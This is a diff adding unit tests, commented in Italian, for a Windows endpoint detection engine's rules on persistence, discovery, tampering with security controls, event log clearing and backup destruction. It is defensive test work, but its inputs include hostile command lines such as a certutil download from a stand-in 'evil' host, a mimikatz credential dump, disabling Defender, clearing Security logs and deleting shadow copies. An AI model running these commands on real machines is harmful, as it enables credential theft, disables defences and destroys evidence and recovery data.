@@ -9,6 +9,9 @@ from app.rules.rule_definitions import (
     rule_suspicious_parent_child, rule_malware_family,
     rule_persistence_path, rule_dll_hijack_path, rule_lolbin_usage,
     rule_high_thread_count, rule_network_beacon, rule_persistence_autorun,
+    rule_autorun_registry_write, rule_scheduled_task_creation,
+    rule_discovery_commands, rule_security_control_tampering,
+    rule_event_log_clearing, rule_recovery_destruction,
     CREDENTIAL_TOOLS, SCANNER_TOOLS, EXPLOIT_TOOLS, POST_EXPLOIT_TOOLS,
     RAT_TOOLS, RANSOMWARE, EVASION_TOOLS, INFO_STEALERS,
     SUSPICIOUS_PATHS, SCRIPT_INTERPRETERS, SUSPICIOUS_PARENT_CHILD,
@@ -416,3 +419,477 @@ class TestThreatDatabaseSize:
 
     def test_script_interpreters_count(self):
         assert len(SCRIPT_INTERPRETERS) >= 30
+
+
+# ═══════════════════════════════════════════════════════════════════
+#  AUDIT — bypass chiusi, FP rimossi, campi reali
+# ═══════════════════════════════════════════════════════════════════
+
+class TestAuditEncodedCommandRealField:
+    def test_command_line_only_triggers(self):
+        r = rule_encoded_command(make_event(
+            "powershell.exe",
+            process_path=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+            command_line="powershell -EncodedCommand SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuAA==",
+        ))
+        assert r.triggered and r.severity == "HIGH"
+
+    def test_short_base64_triggers(self):
+        r = rule_encoded_command(make_event(
+            "powershell.exe",
+            process_path=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+            command_line="powershell.exe -e SQBuAHYAbwBrAGEAAAA=",
+        ))
+        assert r.triggered
+
+    def test_forward_slash_temp_triggers_path_rule(self):
+        from app.rules.rule_definitions import rule_suspicious_execution_path
+        r = rule_suspicious_execution_path(
+            make_event("evil.exe", process_path="C:/Users/vic/AppData/Local/Temp/evil.exe"))
+        assert r.triggered
+
+
+class TestAuditRenameBypass:
+    def test_renamed_tool_in_path_triggers(self):
+        r = rule_known_attack_tool(make_event(
+            "svchost.exe", process_path=r"C:\Temp\mimikatz.exe",
+            command_line="svchost.exe sekurlsa::logonpasswords"))
+        assert r.triggered
+
+    def test_tool_in_command_line_triggers(self):
+        r = rule_known_attack_tool(make_event(
+            "svchost.exe", process_path=r"C:\Windows\System32\svchost.exe",
+            command_line="powershell -c mimikatz sekurlsa::logonpasswords"))
+        assert r.triggered
+
+    def test_legitimate_svchost_silent(self):
+        r = rule_known_attack_tool(make_event(
+            "svchost.exe", process_path=r"C:\Windows\System32\svchost.exe"))
+        assert not r.triggered
+
+
+class TestAuditMalwareFamilyBoundaries:
+    # Nomi che erano FP sistematici col vecchio substring-match.
+    @pytest.mark.parametrize("name", ["uploader.exe", "bitcoin-qt.exe",
+                                      "examiner.exe"])
+    def test_lookalikes_not_flagged(self, name):
+        assert not rule_malware_family(make_event(name)).triggered
+
+    def test_known_residuals_documented(self):
+        # Residui noti (rari in enterprise, severita' contenuta):
+        # "stealthservice" inizia davvero con "steal", "passwordsafe" E' un
+        # password manager (descrizione "Password-related" veritiera, MEDIUM).
+        assert rule_malware_family(make_event("stealthservice.exe")).triggered
+        assert rule_malware_family(make_event("passwordsafe.exe")).severity == "MEDIUM"
+
+    def test_mitre_tactic_id_is_code(self):
+        r = rule_malware_family(make_event("lockbit.exe"))
+        assert r.triggered
+        assert r.mitre_tactic_id == "TA0040"
+        assert not str(r.mitre_tactic_id).startswith("Tactic ")
+
+
+class TestAuditLolbinSystem32Args:
+    def test_certutil_download_args_trigger(self):
+        r = rule_lolbin_usage(make_event(
+            "certutil.exe", process_path=r"C:\Windows\System32\certutil.exe",
+            command_line="certutil -urlcache -split -f http://evil/x.exe C:\\Temp\\x.exe"))
+        assert r.triggered and r.severity == "HIGH"
+
+    def test_certutil_clean_silent(self):
+        r = rule_lolbin_usage(make_event(
+            "certutil.exe", process_path=r"C:\Windows\System32\certutil.exe"))
+        assert not r.triggered
+
+
+class TestAuditDllLoadedModules:
+    def test_loaded_dll_in_temp_triggers(self):
+        r = rule_dll_hijack_path(make_event(
+            "explorer.exe", process_path=r"C:\Windows\explorer.exe",
+            loaded_modules=[r"C:\Users\vic\AppData\Local\Temp\evil.dll"]))
+        assert r.triggered
+
+    def test_loaded_dll_system32_silent(self):
+        r = rule_dll_hijack_path(make_event(
+            "explorer.exe", process_path=r"C:\Windows\explorer.exe",
+            loaded_modules=[r"C:\Windows\System32\kernel32.dll"]))
+        assert not r.triggered
+
+
+class TestAuditNetworkToolStem:
+    def test_masscan_exe_in_temp_flagged(self):
+        r = rule_network_tool(
+            make_event("masscan.exe", process_path=r"C:\Users\vic\AppData\Local\Temp\masscan.exe"))
+        assert r.triggered
+
+
+class TestAuditBeaconHighRisk:
+    def test_anydesk_public_beacon_triggers(self):
+        r = rule_network_beacon(make_event(
+            "anydesk.exe", process_path=r"C:\Program Files\AnyDesk\anydesk.exe",
+            network_connections=[{"remote": "8.8.8.8:443", "state": "ESTABLISHED"}]))
+        assert r.triggered
+
+    def test_ipv6_loopback_not_public(self):
+        r = rule_network_beacon(make_event(
+            "certutil.exe", process_path=r"C:\Windows\System32\certutil.exe",
+            network_connections=[{"remote": "[::1]:443", "state": "ESTABLISHED"}]))
+        assert not r.triggered
+
+
+class TestAuditAutorunFuzzy:
+    def test_typosquat_variant_triggers(self):
+        r = rule_persistence_autorun(make_event(
+            "svch0sts.exe", process_path=r"C:\Users\vic\AppData\Local\Temp\svch0sts.exe"))
+        assert r.triggered
+
+    def test_real_svchost_system32_silent(self):
+        r = rule_persistence_autorun(make_event(
+            "svchost.exe", process_path=r"C:\Windows\System32\svchost.exe"))
+        assert not r.triggered
+
+    def test_real_svchost_with_unreadable_path_is_silent(self):
+        """Falso positivo reale, ricorrente ogni ora.
+
+        Il sensore non riesce a leggere il path dei processi di sistema
+        (svchost gira come SYSTEM in un'altra sessione) e lo lascia vuoto.
+        Con path vuoto il ramo fuzzy concludeva "fuori dai path di sistema"
+        e segnalava il svchost.exe LEGITTIMO: osservato dal vivo con parent
+        services.exe e path vuoto, una volta per ora su una macchina Windows.
+        Path ignoto = dato mancante, non evidenza.
+        """
+        r = rule_persistence_autorun(make_event("svchost.exe", process_path=""))
+        assert not r.triggered
+
+    def test_real_svchost_with_missing_path_field_is_silent(self):
+        r = rule_persistence_autorun(make_event("svchost.exe"))
+        assert not r.triggered
+
+    def test_masquerading_svchost_in_temp_still_flagged(self):
+        """Il path noto e non di sistema deve continuare a scattare."""
+        r = rule_persistence_autorun(make_event(
+            "svchost.exe",
+            process_path=r"C:\Users\vic\AppData\Local\Temp\svchost.exe"))
+        assert r.triggered and r.severity == "HIGH"
+
+    def test_exact_typosquat_name_still_flagged_without_path(self):
+        """Il set esatto resta una regola forte a prescindere dal path."""
+        for name in ("svch0st.exe", "scvhost.exe", "mssecsvc.exe"):
+            assert rule_persistence_autorun(
+                make_event(name, process_path="")).triggered, name
+
+
+class TestRuleAutorunRegistryWrite:
+    """Persistenza a runtime vista dalla command line.
+
+    Prima non esisteva: il Run key era coperto solo dallo snapshot read-only
+    all'avvio (evidenza, non alert), quindi scriverne uno a runtime non
+    generava nulla.
+    """
+
+    def test_reg_add_run_key_flagged(self):
+        r = rule_autorun_registry_write(make_event(
+            "reg.exe",
+            command_line=r"reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run "
+                         r"/v Updater /t REG_SZ /d C:\Users\v\AppData\Local\Temp\x.exe /f"))
+        assert r.triggered and r.severity == "HIGH"
+        assert r.mitre_technique_id == "T1547.001"
+
+    def test_powershell_new_itemproperty_on_run_key_flagged(self):
+        r = rule_autorun_registry_write(make_event(
+            "powershell.exe",
+            command_line=r"powershell -c New-ItemProperty -Path 'HKCU:\Software\Microsoft"
+                         r"\Windows\CurrentVersion\Run' -Name X -Value C:\Temp\x.exe"))
+        assert r.triggered
+
+    def test_runonce_and_policy_run_flagged(self):
+        for key in ("RunOnce", "Policies\\Explorer\\Run"):
+            assert rule_autorun_registry_write(make_event(
+                "reg.exe",
+                command_line=f"reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion"
+                             f"\\{key} /v X /d C:\\x.exe /f")).triggered, key
+
+    def test_reg_query_is_read_and_must_not_fire(self):
+        """La lettura del registro non e' persistenza."""
+        r = rule_autorun_registry_write(make_event(
+            "reg.exe",
+            command_line=r"reg.exe query HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater"))
+        assert not r.triggered
+
+    def test_empty_command_line_not_flagged(self):
+        assert not rule_autorun_registry_write(make_event("reg.exe")).triggered
+
+    def test_unrelated_registry_write_not_flagged(self):
+        r = rule_autorun_registry_write(make_event(
+            "reg.exe",
+            command_line=r"reg.exe add HKCU\Software\Vendor\App /v Theme /d dark /f"))
+        assert not r.triggered
+
+
+class TestRuleScheduledTaskCreation:
+    def test_schtasks_create_flagged(self):
+        r = rule_scheduled_task_creation(make_event(
+            "schtasks.exe",
+            command_line=r"schtasks.exe /create /tn Updater /tr C:\Windows\System32\notepad.exe "
+                         r"/sc once /st 23:59 /f"))
+        assert r.triggered and r.severity == "HIGH"
+        assert r.mitre_technique_id == "T1053.005"
+
+    def test_task_running_powershell_is_critical(self):
+        r = rule_scheduled_task_creation(make_event(
+            "schtasks.exe",
+            command_line="schtasks /create /tn X /tr \"powershell -nop -w hidden -e ABC\" "
+                         "/sc minute /mo 5 /f"))
+        assert r.triggered and r.severity == "CRITICAL"
+
+    def test_schtasks_query_is_read_and_must_not_fire(self):
+        r = rule_scheduled_task_creation(make_event(
+            "schtasks.exe", command_line="schtasks.exe /query /tn Updater"))
+        assert not r.triggered
+
+    def test_empty_command_line_not_flagged(self):
+        assert not rule_scheduled_task_creation(make_event("schtasks.exe")).triggered
+
+
+class TestRuleDiscoveryCommands:
+    def test_whoami_all_flagged(self):
+        r = rule_discovery_commands(make_event("whoami.exe", command_line="whoami.exe /all"))
+        assert r.triggered and r.severity == "MEDIUM"
+        assert r.mitre_tactic_id == "TA0007"
+
+    def test_whoami_priv_flagged(self):
+        assert rule_discovery_commands(
+            make_event("whoami.exe", command_line="whoami /priv")).triggered
+
+    def test_net_user_flagged(self):
+        assert rule_discovery_commands(
+            make_event("net.exe", command_line="net user")).triggered
+
+    def test_net_localgroup_flagged(self):
+        assert rule_discovery_commands(
+            make_event("net.exe", command_line="net localgroup")).triggered
+
+    def test_plain_whoami_not_flagged(self):
+        """`whoami` nudo e' ovunque: build, installer, script."""
+        assert not rule_discovery_commands(
+            make_event("whoami.exe", command_line="whoami")).triggered
+
+    def test_unrelated_process_not_flagged(self):
+        """La regola guarda processi di enumerazione, non una stringa qualsiasi."""
+        assert not rule_discovery_commands(make_event(
+            "python.exe", command_line="python -c \"print('whoami /all')\"")).triggered
+
+    def test_empty_command_line_not_flagged(self):
+        assert not rule_discovery_commands(make_event("whoami.exe")).triggered
+
+    def test_extra_whitespace_still_flagged(self):
+        assert rule_discovery_commands(make_event(
+            "whoami.exe", command_line="  whoami.exe    /all  ")).triggered
+
+
+# ── Manomissione dei controlli e distruzione delle evidenze ──────────────
+#
+# Questi test nascono da una batteria di tecniche "difficili": azioni di un
+# operatore reale (non nomi di tool), pensate per NON somigliare a quello che
+# una regola su stringhe note intercetta. Sei detection mancate su 18, e quattro
+# erano la stessa idea. Ogni test positivo qui è un caso che prima non
+# generava nulla, e ogni test negativo è un uso legittimo dello stesso binario
+# che NON deve allarmare (un detection che spara su `sc query` è rumore, e il
+# rumore brucia la fiducia nell'allarme).
+
+
+class TestRuleSecurityControlTampering:
+    def test_sc_config_disable_defender(self):
+        r = rule_security_control_tampering(make_event(
+            "cmd.exe", command_line="sc.exe config WinDefend start= disabled"))
+        assert r.triggered and r.severity == "CRITICAL"
+        assert r.mitre_technique_id == "T1562"
+
+    def test_net_stop_security_service(self):
+        assert rule_security_control_tampering(make_event(
+            "net.exe", command_line="net stop WinDefend")).triggered
+
+    def test_taskkill_on_av_process(self):
+        assert rule_security_control_tampering(make_event(
+            "taskkill.exe",
+            command_line="taskkill /F /IM MsMpEng.exe")).triggered
+
+    def test_defender_realtime_monitoring_disabled(self):
+        r = rule_security_control_tampering(make_event(
+            "powershell.exe",
+            command_line="Set-MpPreference -DisableRealtimeMonitoring $true"))
+        assert r.triggered and r.severity == "CRITICAL"
+
+    def test_defender_exclusion_added(self):
+        assert rule_security_control_tampering(make_event(
+            "powershell.exe",
+            command_line="Add-MpPreference -ExclusionPath C:\\Users\\Public"
+        )).triggered
+
+    def test_firewall_disabled(self):
+        assert rule_security_control_tampering(make_event(
+            "netsh.exe",
+            command_line="netsh advfirewall set allprofiles state off")).triggered
+
+    def test_audit_policy_cleared(self):
+        assert rule_security_control_tampering(make_event(
+            "auditpol.exe", command_line="auditpol /clear /y")).triggered
+
+    # --- controlli negativi: usi legittimi degli stessi binari ---------------
+    def test_sc_query_is_read_only(self):
+        assert not rule_security_control_tampering(make_event(
+            "sc.exe", command_line="sc.exe query WinDefend")).triggered
+
+    def test_security_service_reenabled_is_not_tampering(self):
+        """Riattivare una protezione non è un attacco: senza questo il SOC
+        riceve un CRITICAL da un intervento di manutenzione."""
+        assert not rule_security_control_tampering(make_event(
+            "sc.exe", command_line="sc.exe config WinDefend start= auto"
+        )).triggered
+
+    def test_taskkill_on_a_normal_app(self):
+        assert not rule_security_control_tampering(make_event(
+            "taskkill.exe", command_line="taskkill /F /IM notepad.exe"
+        )).triggered
+
+    def test_firewall_listing_not_flagged(self):
+        assert not rule_security_control_tampering(make_event(
+            "netsh.exe", command_line="netsh advfirewall firewall show rule name=all"
+        )).triggered
+
+    def test_empty_command_line_not_flagged(self):
+        assert not rule_security_control_tampering(make_event("cmd.exe")).triggered
+
+
+class TestRuleEventLogClearing:
+    def test_wevtutil_cl_security(self):
+        r = rule_event_log_clearing(make_event(
+            "wevtutil.exe", command_line="wevtutil.exe cl Security"))
+        assert r.triggered and r.severity == "CRITICAL"
+        assert r.mitre_technique_id == "T1070.001"
+
+    def test_clear_eventlog_powershell(self):
+        assert rule_event_log_clearing(make_event(
+            "powershell.exe", command_line="Clear-EventLog -LogName Application"
+        )).triggered
+
+    def test_log_disabled_is_also_clearing_traces(self):
+        """`wevtutil sl ... /e:false` disattiva il log: da lì in poi l'evidenza
+        non esiste più, che è lo stesso effetto della cancellazione."""
+        assert rule_event_log_clearing(make_event(
+            "wevtutil.exe", command_line="wevtutil sl Security /e:false"
+        )).triggered
+
+    def test_wevtutil_query_is_read_only(self):
+        assert not rule_event_log_clearing(make_event(
+            "wevtutil.exe", command_line="wevtutil qe Security /c:5 /f:text"
+        )).triggered
+
+    def test_unrelated_clear_of_a_file_is_not_log_clearing(self):
+        assert not rule_event_log_clearing(make_event(
+            "cmd.exe", command_line="del /f C:\\temp\\old.log"
+        )).triggered
+
+
+class TestRuleRecoveryDestruction:
+    def test_bcdedit_disable_recovery(self):
+        r = rule_recovery_destruction(make_event(
+            "bcdedit.exe", command_line="bcdedit /set {default} recoveryenabled no"))
+        assert r.triggered and r.severity == "CRITICAL"
+        assert r.mitre_technique_id == "T1490"
+
+    def test_wbadmin_delete_catalog(self):
+        assert rule_recovery_destruction(make_event(
+            "wbadmin.exe", command_line="wbadmin delete catalog -quiet"
+        )).triggered
+
+    def test_vssadmin_delete_shadows(self):
+        assert rule_recovery_destruction(make_event(
+            "vssadmin.exe", command_line="vssadmin delete shadows /all /quiet"
+        )).triggered
+
+    def test_wmic_shadowcopy_delete(self):
+        assert rule_recovery_destruction(make_event(
+            "wmic.exe", command_line="wmic shadowcopy delete"
+        )).triggered
+
+    def test_vssadmin_list_is_read_only(self):
+        assert not rule_recovery_destruction(make_event(
+            "vssadmin.exe", command_line="vssadmin list shadows"
+        )).triggered
+
+    def test_bcdedit_query_is_read_only(self):
+        assert not rule_recovery_destruction(make_event(
+            "bcdedit.exe", command_line="bcdedit /enum"
+        )).triggered
+
+    def test_backup_creation_is_not_destruction(self):
+        assert not rule_recovery_destruction(make_event(
+            "wbadmin.exe", command_line="wbadmin start backup -backupTarget:D: -allCritical"
+        )).triggered
+
+
+class TestParentChildInjectionBranch:
+    """Un'applicazione utente che lancia un binario di SISTEMA."""
+
+    def test_browser_spawning_svchost(self):
+        r = rule_suspicious_parent_child(make_event(
+            "svchost.exe", parent_process_name="chrome.exe"))
+        assert r.triggered
+        assert r.mitre_technique_id == "T1055"
+
+    def test_browser_spawning_lsass_is_critical(self):
+        r = rule_suspicious_parent_child(make_event(
+            "lsass.exe", parent_process_name="chrome.exe"))
+        assert r.triggered and r.severity == "CRITICAL"
+
+    def test_explorer_spawning_svchost_is_not_flagged(self):
+        """Controprova: il percorso legittimo non deve allarmare."""
+        assert not rule_suspicious_parent_child(make_event(
+            "svchost.exe", parent_process_name="services.exe")).triggered
+
+
+class TestNewRulesAreRegistered:
+    def test_new_rule_ids_present(self):
+        from app.rules.rule_definitions import STATIC_RULES, RULE_NOTES
+        ids = {s.rule_id for s in STATIC_RULES}
+        for rid in ("AEGIS-S016", "AEGIS-S017", "AEGIS-S018",
+                    "AEGIS-S019", "AEGIS-S020", "AEGIS-S021"):
+            assert rid in ids, f"{rid} non registrata"
+            assert rid in RULE_NOTES, f"{rid} senza note/eccezioni per la UI"
+
+
+@pytest.mark.asyncio
+async def test_engine_stamps_rule_ids_live(engine):
+    e = make_event("mimikatz.exe")
+    r = await engine.analyze(e)
+    assert r.is_threat
+    ids = {t.rule_id for t in r.triggered_rules}
+    assert "AEGIS-S001" in ids
+    assert "custom" not in ids
+
+
+@pytest.mark.asyncio
+async def test_engine_allowlist_bypass_closed(engine):
+    # updater.exe in TEMP con mimikatz in cmdline DEVE alertare.
+    e = make_event("updater.exe",
+                   process_path=r"C:\Users\vic\AppData\Local\Temp\updater.exe",
+                   command_line="updater.exe mimikatz sekurlsa::logonpasswords")
+    r = await engine.analyze(e)
+    assert r.is_threat
+
+
+@pytest.mark.asyncio
+async def test_engine_allowlist_legit_updater_silent(engine):
+    e = make_event("updater.exe",
+                   process_path=r"C:\Program Files\Vendor\updater.exe")
+    r = await engine.analyze(e)
+    assert not r.is_threat
+
+
+@pytest.mark.asyncio
+async def test_engine_custom_rule_commandline_alias(engine, tmp_path=None):
+    from app.rules.heuristic_engine import _match_event_field
+    e = make_event("x.exe", command_line="mimikatz sekurlsa")
+    assert _match_event_field(e, "commandLine") == "mimikatz sekurlsa"
+    assert _match_event_field(e, "command_line") == "mimikatz sekurlsa"
